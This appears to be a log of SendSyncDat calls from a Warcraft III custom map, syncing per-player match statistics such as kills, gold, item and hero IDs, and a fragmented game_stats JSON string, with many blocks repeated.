	SendSyncDat("dr.x", "8", "8_5", 1227902028);
	SendSyncDat("dr.x", "8", "9", 1215128178);
	SendSyncDat("dr.x", "8", "id", 7);
	SendSyncDat("dr.x", "3", "1", 2);
	SendSyncDat("dr.x", "3", "2", 9);
	SendSyncDat("dr.x", "3", "3", 65);
	SendSyncDat("dr.x", "3", "4", 7);
	SendSyncDat("dr.x", "3", "5", 0);
	SendSyncDat("dr.x", "3", "6", 42);
	SendSyncDat("dr.x", "3", "7", 3);
	SendSyncDat("dr.x", "3", "8_0", 1227903028);
	SendSyncDat("dr.x", "3", "8_1", 1227895880);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "3", "8_2", 1227900746);
	SendSyncDat("dr.x", "3", "8_3", 1227896904);
	SendSyncDat("dr.x", "3", "8_4", 1227896916);
	SendSyncDat("dr.x", "3", "8_5", 0);
	SendSyncDat("dr.x", "3", "9", 1433631084);
	SendSyncDat("dr.x", "3", "id", 3);
	SendSyncDat("dr.x", "9", "1", 2);
	SendSyncDat("dr.x", "9", "2", 3);
	SendSyncDat("dr.x", "9", "3", 79);
	SendSyncDat("dr.x", "9", "4", 2);
	SendSyncDat("dr.x", "9", "5", 9);
	SendSyncDat("dr.x", "9", "6", 2529);
	SendSyncDat("dr.x", "9", "7", 16);
	SendSyncDat("dr.x", "9", "8_0", 1227902028);
	SendSyncDat("dr.x", "9", "8_1", 1227896911);
	SendSyncDat("dr.x", "9", "8_2", 1227896153);
	SendSyncDat("dr.x", "9", "8_3", 1227897137);
	SendSyncDat("dr.x", "9", "8_4", 0);
	SendSyncDat("dr.x", "9", "8_5", 0);
	SendSyncDat("dr.x", "9", "9", 1311780946);
	SendSyncDat("dr.x", "9", "id", 8);
	SendSyncDat("dr.x", "4", "1", 1);
	SendSyncDat("dr.x", "4", "2", 6);
	SendSyncDat("dr.x", "4", "3", 15);
	SendSyncDat("dr.x", "4", "4", 0);
	SendSyncDat("dr.x", "4", "5", 1);
	SendSyncDat("dr.x", "4", "6", 6);
	SendSyncDat("dr.x", "4", "7", 37);
	SendSyncDat("dr.x", "4", "8_0", 0);
	SendSyncDat("dr.x", "4", "8_1", 0);
	SendSyncDat("dr.x", "4", "8_2", 0);
	SendSyncDat("dr.x", "4", "8_3", 0);
	SendSyncDat("dr.x", "4", "8_4", 0);
	SendSyncDat("dr.x", "4", "8_5", 0);
	SendSyncDat("dr.x", "4", "9", 1332766568);
	SendSyncDat("dr.x", "4", "id", 4);
	SendSyncDat("dr.x", "10", "1", 10);
	SendSyncDat("dr.x", "10", "2", 9);
	SendSyncDat("dr.x", "10", "3", 34);
	SendSyncDat("dr.x", "10", "4", 0);
	SendSyncDat("dr.x", "10", "5", 2);
	SendSyncDat("dr.x", "10", "6", 544);
	SendSyncDat("dr.x", "10", "7", 0);
	SendSyncDat("dr.x", "10", "8_0", 1227900746);
	SendSyncDat("dr.x", "10", "8_1", 1227903809);
	SendSyncDat("dr.x", "10", "8_2", 1227895880);
	SendSyncDat("dr.x", "10", "8_3", 1227896116);
	SendSyncDat("dr.x", "10", "8_4", 0);
	SendSyncDat("dr.x", "10", "8_5", 0);
	SendSyncDat("dr.x", "10", "9", 1211117643);
	SendSyncDat("dr.x", "10", "id", 9);
	SendSyncDat("dr.x", "5", "1", 3);
	SendSyncDat("dr.x", "5", "2", 7);
	SendSyncDat("dr.x", "5", "3", 55);
	SendSyncDat("dr.x", "5", "4", 6);
	SendSyncDat("dr.x", "5", "5", 3);
	SendSyncDat("dr.x", "5", "6", 790);
	SendSyncDat("dr.x", "5", "7", 4);
	SendSyncDat("dr.x", "5", "8_0", 1227901785);
	SendSyncDat("dr.x", "5", "8_1", 1227900744);
	SendSyncDat("dr.x", "5", "8_2", 1227895376);
	SendSyncDat("dr.x", "5", "8_3", 1227903025);
	SendSyncDat("dr.x", "5", "8_4", 1227899469);
	SendSyncDat("dr.x", "5", "8_5", 1227902793);
	SendSyncDat("dr.x", "5", "9", 1432510828);
	SendSyncDat("dr.x", "5", "id", 5);
	SendSyncDat("dr.x", "11", "1", 2);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "1", "1", 0);
	SendSyncDat("dr.x", "1", "2", 10);
	SendSyncDat("dr.x", "1", "3", 42);
	SendSyncDat("dr.x", "1", "4", 5);
	SendSyncDat("dr.x", "1", "5", 1);
	SendSyncDat("dr.x", "1", "6", 263);
	SendSyncDat("dr.x", "1", "7", 8);
	SendSyncDat("dr.x", "1", "8_0", 1227902028);
	SendSyncDat("dr.x", "1", "8_1", 1227902281);
	SendSyncDat("dr.x", "1", "8_2", 1227903818);
	SendSyncDat("dr.x", "1", "8_3", 1227896137);
	SendSyncDat("dr.x", "1", "8_4", 1227895898);
	SendSyncDat("dr.x", "1", "8_5", 1227896116);
	SendSyncDat("dr.x", "1", "9", 1333027688);
	SendSyncDat("dr.x", "1", "id", 1);
	SendSyncDat("dr.x", "7", "1", 17);
	SendSyncDat("dr.x", "7", "2", 2);
	SendSyncDat("dr.x", "7", "3", 155);
	SendSyncDat("dr.x", "7", "4", 5);
	SendSyncDat("dr.x", "7", "5", 14);
	SendSyncDat("dr.x", "7", "6", 4586);
	SendSyncDat("dr.x", "7", "7", 36);
	SendSyncDat("dr.x", "7", "8_0", 1227900746);
	SendSyncDat("dr.x", "7", "8_1", 1227901785);
	SendSyncDat("dr.x", "7", "8_2", 1227901010);
	SendSyncDat("dr.x", "7", "8_3", 1227897158);
	SendSyncDat("dr.x", "7", "8_4", 1227900994);
	SendSyncDat("dr.x", "7", "8_5", 1227899192);
	SendSyncDat("dr.x", "7", "9", 1160786242);
	SendSyncDat("dr.x", "7", "id", 6);
	SendSyncDat("dr.x", "2", "1", 0);
	SendSyncDat("dr.x", "2", "2", 9);
	SendSyncDat("dr.x", "2", "3", 96);
	SendSyncDat("dr.x", "2", "4", 8);
	SendSyncDat("dr.x", "2", "5", 0);
	SendSyncDat("dr.x", "2", "6", 667);
	SendSyncDat("dr.x", "2", "7", 24);
	SendSyncDat("dr.x", "2", "8_0", 1227895380);
	SendSyncDat("dr.x", "2", "8_1", 1227895864);
	SendSyncDat("dr.x", "2", "8_2", 1227903025);
	SendSyncDat("dr.x", "2", "8_3", 1227896137);
	SendSyncDat("dr.x", "2", "8_4", 0);
	SendSyncDat("dr.x", "2", "8_5", 1227896921);
	SendSyncDat("dr.x", "2", "9", 1315074670);
	SendSyncDat("dr.x", "2", "id", 2);
	SendSyncDat("dr.x", "8", "1", 10);
	SendSyncDat("dr.x", "8", "2", 1);
	SendSyncDat("dr.x", "8", "3", 88);
	SendSyncDat("dr.x", "8", "4", 2);
	SendSyncDat("dr.x", "8", "5", 20);
	SendSyncDat("dr.x", "8", "6", 2070);
	SendSyncDat("dr.x", "8", "7", 0);
	SendSyncDat("dr.x", "8", "8_0", 1227895880);
	SendSyncDat("dr.x", "8", "8_1", 1227900994);
	SendSyncDat("dr.x", "8", "8_2", 1227894863);
	SendSyncDat("dr.x", "8", "8_3", 1227899213);
	SendSyncDat("dr.x", "8", "8_4", 1227902793);
	SendSyncDat("dr.x", "8", "8_5", 1227902028);
	SendSyncDat("dr.x", "8", "9", 1215128178);
	SendSyncDat("dr.x", "8", "id", 7);
	SendSyncDat("dr.x", "3", "1", 2);
	SendSyncDat("dr.x", "3", "2", 9);
	SendSyncDat("dr.x", "3", "3", 65);
	SendSyncDat("dr.x", "3", "4", 7);
	SendSyncDat("dr.x", "3", "5", 0);
	SendSyncDat("dr.x", "3", "6", 42);
	SendSyncDat("dr.x", "3", "7", 3);
	SendSyncDat("dr.x", "3", "8_0", 1227903028);
	SendSyncDat("dr.x", "3", "8_1", 1227895880);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "3", "8_2", 1227900746);
	SendSyncDat("dr.x", "3", "8_3", 1227896904);
	SendSyncDat("dr.x", "3", "8_4", 1227896916);
	SendSyncDat("dr.x", "3", "8_5", 0);
	SendSyncDat("dr.x", "3", "9", 1433631084);
	SendSyncDat("dr.x", "3", "id", 3);
	SendSyncDat("dr.x", "9", "1", 2);
	SendSyncDat("dr.x", "9", "2", 3);
	SendSyncDat("dr.x", "9", "3", 79);
	SendSyncDat("dr.x", "9", "4", 2);
	SendSyncDat("dr.x", "9", "5", 9);
	SendSyncDat("dr.x", "9", "6", 2529);
	SendSyncDat("dr.x", "9", "7", 16);
	SendSyncDat("dr.x", "9", "8_0", 1227902028);
	SendSyncDat("dr.x", "9", "8_1", 1227896911);
	SendSyncDat("dr.x", "9", "8_2", 1227896153);
	SendSyncDat("dr.x", "9", "8_3", 1227897137);
	SendSyncDat("dr.x", "9", "8_4", 0);
	SendSyncDat("dr.x", "9", "8_5", 0);
	SendSyncDat("dr.x", "9", "9", 1311780946);
	SendSyncDat("dr.x", "9", "id", 8);
	SendSyncDat("dr.x", "4", "1", 1);
	SendSyncDat("dr.x", "4", "2", 6);
	SendSyncDat("dr.x", "4", "3", 15);
	SendSyncDat("dr.x", "4", "4", 0);
	SendSyncDat("dr.x", "4", "5", 1);
	SendSyncDat("dr.x", "4", "6", 6);
	SendSyncDat("dr.x", "4", "7", 37);
	SendSyncDat("dr.x", "4", "8_0", 0);
	SendSyncDat("dr.x", "4", "8_1", 0);
	SendSyncDat("dr.x", "4", "8_2", 0);
	SendSyncDat("dr.x", "4", "8_3", 0);
	SendSyncDat("dr.x", "4", "8_4", 0);
	SendSyncDat("dr.x", "4", "8_5", 0);
	SendSyncDat("dr.x", "4", "9", 1332766568);
	SendSyncDat("dr.x", "4", "id", 4);
	SendSyncDat("dr.x", "10", "1", 10);
	SendSyncDat("dr.x", "10", "2", 9);
	SendSyncDat("dr.x", "10", "3", 34);
	SendSyncDat("dr.x", "10", "4", 0);
	SendSyncDat("dr.x", "10", "5", 2);
	SendSyncDat("dr.x", "10", "6", 544);
	SendSyncDat("dr.x", "10", "7", 0);
	SendSyncDat("dr.x", "10", "8_0", 1227900746);
	SendSyncDat("dr.x", "10", "8_1", 1227903809);
	SendSyncDat("dr.x", "10", "8_2", 1227895880);
	SendSyncDat("dr.x", "10", "8_3", 1227896116);
	SendSyncDat("dr.x", "10", "8_4", 0);
	SendSyncDat("dr.x", "10", "8_5", 0);
	SendSyncDat("dr.x", "10", "9", 1211117643);
	SendSyncDat("dr.x", "10", "id", 9);
	SendSyncDat("dr.x", "5", "1", 3);
	SendSyncDat("dr.x", "5", "2", 7);
	SendSyncDat("dr.x", "5", "3", 55);
	SendSyncDat("dr.x", "5", "4", 6);
	SendSyncDat("dr.x", "5", "5", 3);
	SendSyncDat("dr.x", "5", "6", 790);
	SendSyncDat("dr.x", "5", "7", 4);
	SendSyncDat("dr.x", "5", "8_0", 1227901785);
	SendSyncDat("dr.x", "5", "8_1", 1227900744);
	SendSyncDat("dr.x", "5", "8_2", 1227895376);
	SendSyncDat("dr.x", "5", "8_3", 1227903025);
	SendSyncDat("dr.x", "5", "8_4", 1227899469);
	SendSyncDat("dr.x", "5", "8_5", 1227902793);
	SendSyncDat("dr.x", "5", "9", 1432510828);
	SendSyncDat("dr.x", "5", "id", 5);
	SendSyncDat("dr.x", "11", "1", 2);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
